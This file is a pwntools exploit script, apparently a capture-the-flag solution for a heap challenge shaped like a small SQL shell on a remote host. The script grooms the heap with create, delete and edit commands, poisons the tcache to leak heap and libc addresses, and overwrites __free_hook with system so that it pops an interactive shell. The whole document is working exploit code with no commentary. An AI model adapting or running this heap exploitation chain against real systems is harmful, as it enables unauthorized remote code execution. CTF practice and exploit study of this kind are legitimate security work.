from pwn import *
context.log_level="debug"
# sh=process("./pwn")
sh=remote('116.236.144.37',26603)
def sendsql(cmd):
    sh.sendlineafter(b"mysql >", cmd)
def add_table(name):
    sendsql(f"CREATE TABLE {name}".encode())
def add_column(table,name):
    sendsql(f"CREATE {name} FROM {table}".encode())
def dele_table(name):
    sendsql(f"DELETE TABLE {name}".encode())
def dele_column(table,name):
    sendsql(f"DELETE {name} FROM {table}".encode())
def show_table(name):
    sendsql(f"SHOW TABLE {name}".encode())
def edit_column(table,name,newname,ctt):
    sendsql(f"EDIT {name} FROM {table}")
    if type(newname) == bytes:
        sh.sendafter(b"Column name:\n", newname)
    else:
        sh.sendlineafter(b"Column name:\n", newname.encode())
    sh.sendlineafter(b"Column Content: \n", ctt.encode())
add_table("t1")
add_table("t2")
add_column("t1", "t1c1")
add_column("t1", "t1c2")

add_table("tt")

dele_column("t1", "t1c1")
add_column("t1", "t1c1") #change position
edit_column("t1", "t1c2", "t1c2t1c2t1c2t1c","test") #next->t2
add_table("t3")
dele_table("t3")
dele_table("t2") #tcache: t2->t3
show_table("t1")

sh.recvuntil(b"Column Name: ")
sh.recvuntil(b"Column Name: ")
leak_heap=u64(sh.recv(6).ljust(8,b'\x00'))
heap_base=(leak_heap>>12)<<12
success("heap_base:"+hex(heap_base))

add_table("t2")

for i in range(8):
    add_column("tt", f"ttc{i}")
add_table("t3")
add_table("t4")
add_table("t5")
add_column("t4", "t2c1")
add_column("t4", "t2c2")

dele_column("t4", "t2c1")
add_column("t4", "t2c1") #change position

add_column("t3", "t3c1") #heapbase+0x12f0

dele_table("tt")

# heapbase+0xe90
# gdb.attach(sh,"b *$rebase(0x1D80)\nc")
edit_column("t4", "t2c2", "t2c2t2c2t2c2t2c","test") #next->t3

# gdb.attach(sh,"b *$rebase(0x1D80)\nc")
success("target:"+hex(heap_base+0x12f0+0x30))
sendsql(b"EDIT "+(heap_base+0x12f0).to_bytes(6, "little")+b" FROM t4")
sh.sendafter(b"Column name:\n", p64(heap_base+0xe90+0x10)+p64(0x31))
sh.sendlineafter(b"Column Content: \n", b"t5")
# 1C74
# gdb.attach(sh,"b *$rebase(0x1C74)\nc")
show_table("t3")

leak_libc=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
libcbase=leak_libc-0x1ecbe0
success("libcbase:"+hex(libcbase))

libc=ELF("./libc-2.31.so")
libc.address=libcbase
freehook=libc.sym['__free_hook']
system=libc.sym['system']
add_table("tt1")
add_table("tt2")
add_table("tt3")
add_table("tt4")
add_table("tt5")
add_table("/bin/sh")
add_column("t2", "t2t2t2")
dele_table("t2") #t2->heap_base+0x5e0

sendsql(b"EDIT "+(heap_base+0x5e0).to_bytes(6, "little")+b" FROM t1")
sh.sendafter(b"Column name:\n", p64(freehook))
sh.sendlineafter(b"Column Content: \n", b"t2t2t2")

add_table("haha")

sendsql(b"CREATE TABLE "+p64(system))

dele_table("/bin/sh")
# gdb.attach(sh)
sh.interactive()